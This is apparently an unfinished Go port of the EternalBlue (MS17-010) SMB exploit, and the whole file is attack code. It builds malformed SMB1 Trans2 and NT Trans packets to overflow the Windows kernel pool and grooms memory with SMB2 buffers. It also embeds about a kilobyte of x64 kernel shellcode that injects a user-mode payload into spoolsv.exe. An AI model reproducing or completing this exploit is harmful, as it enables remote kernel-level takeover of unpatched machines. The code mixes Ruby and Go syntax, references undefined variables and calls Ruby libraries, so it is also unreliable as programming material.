package main

import{
    "fmt"
}



//exploit

ProcessName := "spoolsv.exe"
MaxExploitAttempts := 3
GroomAllocations := 12
GroomDelta := 5

func exploit
    for i = 1; i<MaxExploitAttempts; i++{
        grooms := GroomAllocations + GroomDelta * (i-1)
        smb_eternalblue(ProcessName, grooms)
        secs := 0

        while flag:=0 and secs<5{
            secs:= secs + 1
            sleep 1
        }
    }


func smb_eternalblue(processname, grooms){

    // STEP 0: Pre-calculate what we can
    shellcode := make_kernel_user_payload(payload.encode, 0, 0, 0, 0, 0)
    payload_hdr_pkt := make_smb2_payload_headers_packet()
    payload_body_pkt := make_smb2_payload_body_packet(shellcode)


    // STEP 1: Connect to IPC$ share
    fmt.Println("Contectando al objetivo")
    client, tree, sock := smb1_anonymous_connect_ipc()
    fmt.Println("Conexión establecida para la explotacion")
    // println "Tryng exploit with //{grooms} Groom Allocations."

    // STEP 2: Creando un large buffer SMB1
    fmt.Println("Enviando todos menos el último fragmento del paquete del exploit")
    smb1_large_buffer(client, tree, sock)

    // STEP 3: Groom the pool con los paquetees del payload y los paquetes open/close de SMBv1
    fmt.Println("Starting non-paged pool grooming")

    //initialize_groom_threads(ip, port, payload, grooms)
    fhs_sock := smb1_free_hole(true)




    !!!MIRAI QUE COÑO ES ESTO
    var groom_socks := [] 

    fmt_Println("Sending SMBv2 buffers")
    smb2_grooms(grooms, payload_hdr_pkt)

    fhf_sock := smb1_free_hole(false)

    fmt_Println("Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.")
    fhs_sock.shutdown()

    fmt.Println("Sending final SMBv2 buffers.") // 6x
    smb2_grooms(6, payload_hdr_pkt) // todo: magic //

    fhf_sock.shutdown()

    fmt.Println("Sending last fragment of exploit packet!")
    //Type can be :eb_trans2_zero, :eb_trans2_buffer, or :eb_trans2_exploit
    final_exploit_pkt := make_smb1_trans2_exploit_packet(tree.id, client.user_id, :eb_trans2_exploit, 15)
    sock.put(final_exploit_pkt)

    fmt.Println("Receiving response from exploit packet")
    code, raw := smb1_get_response(sock)

    if code == 0xc000000d //STATUS_INVALID_PARAMETER (0xC000000D)
    fmt_Println("ETERNALBLUE overwrite completed successfully (0xC000000D)!")
    end

    // Step 4: Send the payload
    fmt.Println("Sending egg to corrupted connection.")

    @groom_socks.each{ |gsock| gsock.put(payload_body_pkt.first(2920)) }
    @groom_socks.each{ |gsock| gsock.put(payload_body_pkt[2920..(4204 - 0x84)]) }

    fmt.Println("Triggering free of corrupted buffer.")
    // tree disconnect
    // logoff and x
    // note: these aren't necessary, just close the sockets


}


func smb2_grooms (grooms, payload_hdr_pkt){
    grooms.times do |groom_id|
    gsock := connect(false)
    append gsock in grooms_socks
    gsock.put(payload_hdr_pkt)
}

func smb1_anonymous_connect_ipc(){

    sock := connect(false)
    dispatcher (new sock)
    client -> new smb connect //mirar libreria smb
    client.negotiate //puede seguir formando parte de la libreria
    sock.put(pkt)

    code, raw, response := smb1_get_response(sock)

    if code != 0{
        fmt.Println("Error con login anonimo")
    }
    client.user_id := response.user_id
    tree := client.tree_connect("\\\\{datastore['RHOST']}\\IPC$") //Poner host remoto
    return client, tree, sock    
}


func smb1_large_buffer(client, tree, sock){

    nt_trans_pkt := make_smb1_nt_trans_packet(tree.id, client.user_id)

    # send NT Trans
    fmt.Println("Sending NT Trans Request packet")
    sock.put(nt_trans_pkt)

    fmt.Println("Receiving NT Trans packet")
    raw = sock.get_once

    # Initial Trans2  request
    trans2_pkt_nulled := make_smb1_trans2_exploit_packet(tree.id, client.user_id, :eb_trans2_zero, 0)

    # send all but last packet
    for i:=1; i<14; i++{
        trans2_pkt_nulled := trans2_pkt_nulled + make_smb1_trans2_exploit_packet(tree.id, client.user_id, :eb_trans2_buffer, i)
    }

    trans2_pkt_nulled := trans2_pkt_nulled + make_smb1_echo_packet(tree.id, client.user_id)

    fmt.Println("Sending malformed Trans2 packets")
    sock.put(trans2_pkt_nulled)

    sock.get_once
}


func smb1_free_hole(start){
    sock := connect(false)
    dispatcher := RubySMB::Dispatcher::Socket.new(sock)
    client := RubySMB::Client.new(dispatcher, smb1: true, smb2: false, username: '', password: '')
    client.negotiate

    pkt := ""

    if start{
      fmt.Println("Sending start free hole packet.")
      pkt := make_smb1_free_hole_session_packet("\x07\xc0", "\x2d\x01", "\xf0\xff\x00\x00\x00")
    }else{
      fmt.Println("Sending end free hole packet.")
      pkt := make_smb1_free_hole_session_packet("\x07\x40", "\x2c\x01", "\xf8\x87\x00\x00\x00")
    }

    //dump_packet(pkt)
    sock.put(pkt)

    fmt.Println("Receiving free hole response.")
    sock.get_once

    return sock
}

func smb1_get_response(sock){
    raw := sock.get_once
    response := RubySMB::SMB1::SMBHeader.read(raw[4..-1])
    code := response.nt_status
    return code, raw, response
end
}


  func make_smb2_payload_headers_packet{
    // dont need a library here, the packet is essentially nonsensical
    pkt = ""
    pkt := pkt + "\x00"             // session message
    pkt := pkt + "\x00\xff\xf7"     // size
    pkt := pkt + "\xfeSMB"          // SMB2
    pkt := pkt + "\x00" * 124

    pkt
}

  func make_smb2_payload_body_packet(kernel_user_payload){
    // precalculated lengths
    pkt_max_len := 4204
    pkt_setup_len := 497
    pkt_max_payload := pkt_max_len - pkt_setup_len // 3575

    // this packet holds padding, KI_USER_SHARED_DATA addresses, and shellcode
    pkt = ""

    // padding
    pkt := pkt + "\x00" * 0x8
    pkt := pkt + "\x03\x00\x00\x00"
    pkt := pkt + "\x00" * 0x1c
    pkt := pkt + "\x03\x00\x00\x00"
    pkt := pkt + "\x00" * 0x74

    // KI_USER_SHARED_DATA addresses
    pkt := pkt + "\xb0\x00\xd0\xff\xff\xff\xff\xff" * 2 // x64 address
    pkt := pkt + "\x00" * 0x10
    pkt := pkt + "\xc0\xf0\xdf\xff" * 2                 // x86 address
    pkt := pkt + "\x00" * 0xc4

    // payload addreses
    pkt := pkt + "\x90\xf1\xdf\xff"
    pkt := pkt + "\x00" * 0x4
    pkt := pkt + "\xf0\xf1\xdf\xff"
    pkt := pkt + "\x00" * 0x40

    pkt := pkt + "\xf0\x01\xd0\xff\xff\xff\xff\xff"
    pkt := pkt + "\x00" * 0x8
    pkt := pkt + "\x00\x02\xd0\xff\xff\xff\xff\xff"
    pkt := pkt + "\x00"

    pkt := pkt + kernel_user_payload

    // fill out the rest, this can be randomly generated
    pkt := pkt + "\x00" * (pkt_max_payload - kernel_user_payload.length)

    pkt
  
}
  func make_smb1_echo_packet(tree_id, user_id){
    pkt = ""
    pkt := pkt + "\x00"               // type
    pkt := pkt + "\x00\x00\x31"       // len = 49
    pkt := pkt + "\xffSMB"            // SMB1
    pkt := pkt + "\x2b"               // Echo
    pkt := pkt + "\x00\x00\x00\x00"   // Success
    pkt := pkt + "\x18"               // flags
    pkt := pkt + "\x07\xc0"           // flags2
    pkt := pkt + "\x00\x00"           // PID High
    pkt := pkt + "\x00\x00\x00\x00"   // Signature1
    pkt := pkt + "\x00\x00\x00\x00"   // Signature2
    pkt := pkt + "\x00\x00"           // Reserved
    pkt := pkt + [tree_id].pack("S>") // Tree ID
    pkt := pkt + "\xff\xfe"           // PID
    pkt := pkt + [user_id].pack("S>") // UserID
    pkt := pkt + "\x40\x00"           // MultiplexIDs

    pkt := pkt + "\x01"               // Word count
    pkt := pkt + "\x01\x00"           // Echo count
    pkt := pkt + "\x0c\x00"           // Byte count

    // echo data
    // this is an existing IDS signature, and can be nulled out
    //pkt := pkt + "\x4a\x6c\x4a\x6d\x49\x68\x43\x6c\x42\x73\x72\x00"
    pkt := pkt +  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00"

    pkt
  }

  // Type can be :eb_trans2_zero, :eb_trans2_buffer, or :eb_trans2_exploit
  func make_smb1_trans2_exploit_packet(tree_id, user_id, type, timeout){
    timeout := (timeout * 0x10) + 3

    pkt := ""
    pkt := pkt + "\x00"                   // Session message
    pkt := pkt + "\x00\x10\x35"           // length
    pkt := pkt + "\xffSMB"                // SMB1
    pkt := pkt + "\x33"                   // Trans2 request
    pkt := pkt + "\x00\x00\x00\x00"       // NT SUCCESS
    pkt := pkt + "\x18"                   // Flags
    pkt := pkt + "\x07\xc0"               // Flags2
    pkt := pkt + "\x00\x00"               // PID High
    pkt := pkt + "\x00\x00\x00\x00"       // Signature1
    pkt := pkt + "\x00\x00\x00\x00"       // Signature2
    pkt := pkt + "\x00\x00"               // Reserved
    pkt := pkt + [tree_id].pack("S>")       // TreeID
    pkt := pkt + "\xff\xfe"               // PID
    pkt := pkt + [user_id].pack("S>")       // UserID
    pkt := pkt + "\x40\x00"               // MultiplexIDs

    pkt := pkt + "\x09"                   // Word Count
    pkt := pkt + "\x00\x00"               // Total Param Count
    pkt := pkt + "\x00\x10"               // Total Data Count
    pkt := pkt + "\x00\x00"               // Max Param Count
    pkt := pkt + "\x00\x00"               // Max Data Count
    pkt := pkt + "\x00"                   // Max Setup Count
    pkt := pkt + "\x00"                   // Reserved
    pkt := pkt + "\x00\x10"               // Flags
    pkt := pkt + "\x35\x00\xd0"           // Timeouts
    pkt := pkt + timeout.chr
    pkt := pkt + "\x00\x00"               // Reserved
    pkt := pkt + "\x00\x10"               // Parameter Count

    //pkt := pkt + "\x74\x70"               // Parameter Offset
    //pkt := pkt + "\x47\x46"               // Data Count
    //pkt := pkt + "\x45\x6f"               // Data Offset
    //pkt := pkt + "\x4c"                   // Setup Count
    //pkt := pkt + "\x4f"                   // Reserved

    if type == :eb_trans2_exploit{
      vprint_status("Making :eb_trans2_exploit packet")

      pkt := pkt + "\x41" * 2957

      pkt := pkt + "\x80\x00\xa8\x00"                     // overflow

      pkt := pkt + "\x00" * 0x10
      pkt := pkt + "\xff\xff"
      pkt := pkt + "\x00" * 0x6
      pkt := pkt + "\xff\xff"
      pkt := pkt + "\x00" * 0x16

      pkt := pkt + "\x00\xf1\xdf\xff"             // x86 addresses
      pkt := pkt + "\x00" * 0x8
      pkt := pkt + "\x20\xf0\xdf\xff"

      pkt := pkt + "\x00\xf1\xdf\xff\xff\xff\xff\xff" // x64

      pkt := pkt + "\x60\x00\x04\x10"
      pkt := pkt + "\x00" * 4

      pkt := pkt + "\x80\xef\xdf\xff"

      pkt := pkt + "\x00" * 4
      pkt := pkt + "\x10\x00\xd0\xff\xff\xff\xff\xff"
      pkt := pkt + "\x18\x01\xd0\xff\xff\xff\xff\xff"
      pkt := pkt + "\x00" * 0x10

      pkt := pkt + "\x60\x00\x04\x10"
      pkt := pkt + "\x00" * 0xc
      pkt := pkt + "\x90\xff\xcf\xff\xff\xff\xff\xff"
      pkt := pkt + "\x00" * 0x8
      pkt := pkt + "\x80\x10"
      pkt := pkt + "\x00" * 0xe
      pkt := pkt + "\x39"
      pkt := pkt + "\xbb"

      pkt := pkt + "\x41" * 965

      return pkt
    }

    if type == :eb_trans2_zero{
      vprint_status("Making :eb_trans2_zero packet")
      pkt := pkt + "\x00" * 2055
      pkt := pkt + "\x83\xf3"
      pkt := pkt + "\x41" * 2039
      //pkt := pkt + "\x00" * 4096
    else
      vprint_status("Making :eb_trans2_buffer packet")
      pkt := pkt + "\x41" * 4096
    }

    pkt

  }

  func make_smb1_nt_trans_packet(tree_id, user_id){
    pkt = ""
    pkt := pkt + "\x00"                   // Session message
    pkt := pkt + "\x00\x04\x38"           // length
    pkt := pkt + "\xffSMB"                // SMB1
    pkt := pkt + "\xa0"                   // NT Trans
    pkt := pkt + "\x00\x00\x00\x00"       // NT SUCCESS
    pkt := pkt + "\x18"                   // Flags
    pkt := pkt + "\x07\xc0"               // Flags2
    pkt := pkt + "\x00\x00"               // PID High
    pkt := pkt + "\x00\x00\x00\x00"       // Signature1
    pkt := pkt + "\x00\x00\x00\x00"       // Signature2
    pkt := pkt + "\x00\x00"               // Reserved
    pkt := pkt + [tree_id].pack("S>")       // TreeID
    pkt := pkt + "\xff\xfe"               // PID
    pkt := pkt + [user_id].pack("S>")       // UserID
    pkt := pkt + "\x40\x00"               // MultiplexID

    pkt := pkt + "\x14"                   // Word Count
    pkt := pkt + "\x01"                   // Max Setup Count
    pkt := pkt + "\x00\x00"               // Reserved
    pkt := pkt + "\x1e\x00\x00\x00"       // Total Param Count
    pkt := pkt + "\xd0\x03\x01\x00"       // Total Data Count
    pkt := pkt + "\x1e\x00\x00\x00"       // Max Param Count
    pkt := pkt + "\x00\x00\x00\x00"       // Max Data Count
    pkt := pkt + "\x1e\x00\x00\x00"       // Param Count
    pkt := pkt + "\x4b\x00\x00\x00"       // Param Offset
    pkt := pkt + "\xd0\x03\x00\x00"       // Data Count
    pkt := pkt + "\x68\x00\x00\x00"       // Data Offset
    pkt := pkt + "\x01"                   // Setup Count
    pkt := pkt + "\x00\x00"               // Function <unknown>
    pkt := pkt + "\x00\x00"               // Unknown NT transaction (0) setup
    pkt := pkt + "\xec\x03"               // Byte Count
    pkt := pkt + "\x00" * 0x1f            // NT Parameters

    // undocumented
    pkt := pkt + "\x01"
    pkt := pkt + "\x00" * 0x3cd

    pkt
}

  func make_smb1_free_hole_session_packet(flags2, vcnum, native_os){
    pkt = ""
    pkt := pkt + "\x00"                   // Session message
    pkt := pkt + "\x00\x00\x51"           // length
    pkt := pkt + "\xffSMB"                // SMB1
    pkt := pkt + "\x73"                   // Session Setup AndX
    pkt := pkt + "\x00\x00\x00\x00"       // NT SUCCESS
    pkt := pkt + "\x18"                   // Flags
    pkt := pkt + flags2                   // Flags2
    pkt := pkt + "\x00\x00"               // PID High
    pkt := pkt + "\x00\x00\x00\x00"       // Signature1
    pkt := pkt + "\x00\x00\x00\x00"       // Signature2
    pkt := pkt + "\x00\x00"               // Reserved
    pkt := pkt + "\x00\x00"               // TreeID
    pkt := pkt + "\xff\xfe"               // PID
    pkt := pkt + "\x00\x00"               // UserID
    pkt := pkt + "\x40\x00"               // MultiplexID
    //pkt := pkt + "\x00\x00"               // Reserved

    pkt := pkt + "\x0c"                   // Word Count
    pkt := pkt + "\xff"                   // No further commands
    pkt := pkt + "\x00"                   // Reserved
    pkt := pkt + "\x00\x00"               // AndXOffset
    pkt := pkt + "\x04\x11"               // Max Buffer
    pkt := pkt + "\x0a\x00"               // Max Mpx Count
    pkt := pkt + vcnum                    // VC Number
    pkt := pkt + "\x00\x00\x00\x00"       // Session key
    pkt := pkt + "\x00\x00"               // Security blob length
    pkt := pkt + "\x00\x00\x00\x00"       // Reserved
    pkt := pkt + "\x00\x00\x00\x80"       // Capabilities
    pkt := pkt + "\x16\x00"               // Byte count
    //pkt := pkt + "\xf0"                   // Security Blob: <MISSING>
    //pkt := pkt + "\xff\x00\x00\x00"       // Native OS
    //pkt := pkt + "\x00\x00"               // Native LAN manager
    //pkt := pkt + "\x00\x00"               // Primary domain
    pkt := pkt + native_os
    pkt := pkt + "\x00" * 17              // Extra byte params

    pkt
  }

  func make_smb1_anonymous_login_packet{
    // Neither Rex nor RubySMB appear to support Anon login?
    pkt = ""
    pkt := pkt + "\x00"                   // Session message
    pkt := pkt + "\x00\x00\x88"           // length
    pkt := pkt + "\xffSMB"                // SMB1
    pkt := pkt + "\x73"                   // Session Setup AndX
    pkt := pkt + "\x00\x00\x00\x00"       // NT SUCCESS
    pkt := pkt + "\x18"                   // Flags
    pkt := pkt + "\x07\xc0"               // Flags2
    pkt := pkt + "\x00\x00"               // PID High
    pkt := pkt + "\x00\x00\x00\x00"       // Signature1
    pkt := pkt + "\x00\x00\x00\x00"       // Signature2
    pkt := pkt + "\x00\x00"               // TreeID
    pkt := pkt + "\xff\xfe"               // PID
    pkt := pkt + "\x00\x00"               // Reserved
    pkt := pkt + "\x00\x00"               // UserID
    pkt := pkt + "\x40\x00"               // MultiplexID

    pkt := pkt + "\x0d"                   // Word Count
    pkt := pkt + "\xff"                   // No further commands
    pkt := pkt + "\x00"                   // Reserved
    pkt := pkt + "\x88\x00"               // AndXOffset
    pkt := pkt + "\x04\x11"               // Max Buffer
    pkt := pkt + "\x0a\x00"               // Max Mpx Count
    pkt := pkt + "\x00\x00"               // VC Number
    pkt := pkt + "\x00\x00\x00\x00"       // Session key
    pkt := pkt + "\x01\x00"               // ANSI pw length
    pkt := pkt + "\x00\x00"               // Unicode pw length
    pkt := pkt + "\x00\x00\x00\x00"       // Reserved
    pkt := pkt + "\xd4\x00\x00\x00"       // Capabilities
    pkt := pkt + "\x4b\x00"               // Byte count
    pkt := pkt + "\x00"                   // ANSI pw
    pkt := pkt + "\x00\x00"               // Account name
    pkt := pkt + "\x00\x00"               // Domain name

    // Windows 2000 2195
    pkt := pkt + "\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32"
    pkt := pkt + "\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00\x35\x00"
    pkt := pkt + "\x00\x00"

    // Windows 2000 5.0
    pkt := pkt + "\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32"
    pkt := pkt + "\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00\x2e\x00\x30\x00\x00\x00"

    pkt
  }

  // ring3 = user mode encoded payload
  // proc_name = process to inject APC into
  // ep_thl_b = EPROCESS.ThreadListHead.Blink offset
  // et_alertable = ETHREAD.Alertable offset
  // teb_acp = TEB.ActivationContextPointer offset
  // et_tle = ETHREAD.ThreadListEntry offset
  func make_kernel_user_payload(ring3, proc_name, ep_thl_b, et_alertable, teb_acp, et_tle){
    sc = make_kernel_shellcode
    sc := pkt + [ring3.length].pack("S<")
    sc := pkt + ring3
    sc
  }

  func make_kernel_shellcode{
    // https://github.com/RiskSense-Ops/MS17-010/blob/master/payloads/x64/src/exploit/kernel.asm
    // Name: kernel
    // Length: 1019 bytes

    //"\xcc"+
    "\xB9\x82\x00\x00\xC0\x0F\x32\x48\xBB\xF8\x0F\xD0\xFF\xFF\xFF\xFF" +
    "\xFF\x89\x53\x04\x89\x03\x48\x8D\x05\x0A\x00\x00\x00\x48\x89\xC2" +
    "\x48\xC1\xEA\x20\x0F\x30\xC3\x0F\x01\xF8\x65\x48\x89\x24\x25\x10" +
    "\x00\x00\x00\x65\x48\x8B\x24\x25\xA8\x01\x00\x00\x50\x53\x51\x52" +
    "\x56\x57\x55\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41" +
    "\x56\x41\x57\x6A\x2B\x65\xFF\x34\x25\x10\x00\x00\x00\x41\x53\x6A" +
    "\x33\x51\x4C\x89\xD1\x48\x83\xEC\x08\x55\x48\x81\xEC\x58\x01\x00" +
    "\x00\x48\x8D\xAC\x24\x80\x00\x00\x00\x48\x89\x9D\xC0\x00\x00\x00" +
    "\x48\x89\xBD\xC8\x00\x00\x00\x48\x89\xB5\xD0\x00\x00\x00\x48\xA1" +
    "\xF8\x0F\xD0\xFF\xFF\xFF\xFF\xFF\x48\x89\xC2\x48\xC1\xEA\x20\x48" +
    "\x31\xDB\xFF\xCB\x48\x21\xD8\xB9\x82\x00\x00\xC0\x0F\x30\xFB\xE8" +
    "\x38\x00\x00\x00\xFA\x65\x48\x8B\x24\x25\xA8\x01\x00\x00\x48\x83" +
    "\xEC\x78\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59" +
    "\x41\x58\x5D\x5F\x5E\x5A\x59\x5B\x58\x65\x48\x8B\x24\x25\x10\x00" +
    "\x00\x00\x0F\x01\xF8\xFF\x24\x25\xF8\x0F\xD0\xFF\x56\x41\x57\x41" +
    "\x56\x41\x55\x41\x54\x53\x55\x48\x89\xE5\x66\x83\xE4\xF0\x48\x83" +
    "\xEC\x20\x4C\x8D\x35\xE3\xFF\xFF\xFF\x65\x4C\x8B\x3C\x25\x38\x00" +
    "\x00\x00\x4D\x8B\x7F\x04\x49\xC1\xEF\x0C\x49\xC1\xE7\x0C\x49\x81" +
    "\xEF\x00\x10\x00\x00\x49\x8B\x37\x66\x81\xFE\x4D\x5A\x75\xEF\x41" +
    "\xBB\x5C\x72\x11\x62\xE8\x18\x02\x00\x00\x48\x89\xC6\x48\x81\xC6" +
    "\x08\x03\x00\x00\x41\xBB\x7A\xBA\xA3\x30\xE8\x03\x02\x00\x00\x48" +
    "\x89\xF1\x48\x39\xF0\x77\x11\x48\x8D\x90\x00\x05\x00\x00\x48\x39" +
    "\xF2\x72\x05\x48\x29\xC6\xEB\x08\x48\x8B\x36\x48\x39\xCE\x75\xE2" +
    "\x49\x89\xF4\x31\xDB\x89\xD9\x83\xC1\x04\x81\xF9\x00\x00\x01\x00" +
    "\x0F\x8D\x66\x01\x00\x00\x4C\x89\xF2\x89\xCB\x41\xBB\x66\x55\xA2" +
    "\x4B\xE8\xBC\x01\x00\x00\x85\xC0\x75\xDB\x49\x8B\x0E\x41\xBB\xA3" +
    "\x6F\x72\x2D\xE8\xAA\x01\x00\x00\x48\x89\xC6\xE8\x50\x01\x00\x00" +
    "\x41\x81\xF9\xBF\x77\x1F\xDD\x75\xBC\x49\x8B\x1E\x4D\x8D\x6E\x10" +
    "\x4C\x89\xEA\x48\x89\xD9\x41\xBB\xE5\x24\x11\xDC\xE8\x81\x01\x00" +
    "\x00\x6A\x40\x68\x00\x10\x00\x00\x4D\x8D\x4E\x08\x49\xC7\x01\x00" +
    "\x10\x00\x00\x4D\x31\xC0\x4C\x89\xF2\x31\xC9\x48\x89\x0A\x48\xF7" +
    "\xD1\x41\xBB\x4B\xCA\x0A\xEE\x48\x83\xEC\x20\xE8\x52\x01\x00\x00" +
    "\x85\xC0\x0F\x85\xC8\x00\x00\x00\x49\x8B\x3E\x48\x8D\x35\xE9\x00" +
    "\x00\x00\x31\xC9\x66\x03\x0D\xD7\x01\x00\x00\x66\x81\xC1\xF9\x00" +
    "\xF3\xA4\x48\x89\xDE\x48\x81\xC6\x08\x03\x00\x00\x48\x89\xF1\x48" +
    "\x8B\x11\x4C\x29\xE2\x51\x52\x48\x89\xD1\x48\x83\xEC\x20\x41\xBB" +
    "\x26\x40\x36\x9D\xE8\x09\x01\x00\x00\x48\x83\xC4\x20\x5A\x59\x48" +
    "\x85\xC0\x74\x18\x48\x8B\x80\xC8\x02\x00\x00\x48\x85\xC0\x74\x0C" +
    "\x48\x83\xC2\x4C\x8B\x02\x0F\xBA\xE0\x05\x72\x05\x48\x8B\x09\xEB" +
    "\xBE\x48\x83\xEA\x4C\x49\x89\xD4\x31\xD2\x80\xC2\x90\x31\xC9\x41" +
    "\xBB\x26\xAC\x50\x91\xE8\xC8\x00\x00\x00\x48\x89\xC1\x4C\x8D\x89" +
    "\x80\x00\x00\x00\x41\xC6\x01\xC3\x4C\x89\xE2\x49\x89\xC4\x4D\x31" +
    "\xC0\x41\x50\x6A\x01\x49\x8B\x06\x50\x41\x50\x48\x83\xEC\x20\x41" +
    "\xBB\xAC\xCE\x55\x4B\xE8\x98\x00\x00\x00\x31\xD2\x52\x52\x41\x58" +
    "\x41\x59\x4C\x89\xE1\x41\xBB\x18\x38\x09\x9E\xE8\x82\x00\x00\x00" +
    "\x4C\x89\xE9\x41\xBB\x22\xB7\xB3\x7D\xE8\x74\x00\x00\x00\x48\x89" +
    "\xD9\x41\xBB\x0D\xE2\x4D\x85\xE8\x66\x00\x00\x00\x48\x89\xEC\x5D" +
    "\x5B\x41\x5C\x41\x5D\x41\x5E\x41\x5F\x5E\xC3\xE9\xB5\x00\x00\x00" +
    "\x4D\x31\xC9\x31\xC0\xAC\x41\xC1\xC9\x0D\x3C\x61\x7C\x02\x2C\x20" +
    "\x41\x01\xC1\x38\xE0\x75\xEC\xC3\x31\xD2\x65\x48\x8B\x52\x60\x48" +
    "\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x12\x48\x8B\x72\x50\x48\x0F" +
    "\xB7\x4A\x4A\x45\x31\xC9\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41" +
    "\xC1\xC9\x0D\x41\x01\xC1\xE2\xEE\x45\x39\xD9\x75\xDA\x4C\x8B\x7A" +
    "\x20\xC3\x4C\x89\xF8\x41\x51\x41\x50\x52\x51\x56\x48\x89\xC2\x8B" +
    "\x42\x3C\x48\x01\xD0\x8B\x80\x88\x00\x00\x00\x48\x01\xD0\x50\x8B" +
    "\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\x48\xFF\xC9\x41\x8B\x34\x88" +
    "\x48\x01\xD6\xE8\x78\xFF\xFF\xFF\x45\x39\xD9\x75\xEC\x58\x44\x8B" +
    "\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01" +
    "\xD0\x41\x8B\x04\x88\x48\x01\xD0\x5E\x59\x5A\x41\x58\x41\x59\x41" +
    "\x5B\x41\x53\xFF\xE0\x56\x41\x57\x55\x48\x89\xE5\x48\x83\xEC\x20" +
    "\x41\xBB\xDA\x16\xAF\x92\xE8\x4D\xFF\xFF\xFF\x31\xC9\x51\x51\x51" +
    "\x51\x41\x59\x4C\x8D\x05\x1A\x00\x00\x00\x5A\x48\x83\xEC\x20\x41" +
    "\xBB\x46\x45\x1B\x22\xE8\x68\xFF\xFF\xFF\x48\x89\xEC\x5D\x41\x5F" +
    "\x5E\xC3"
  }

}
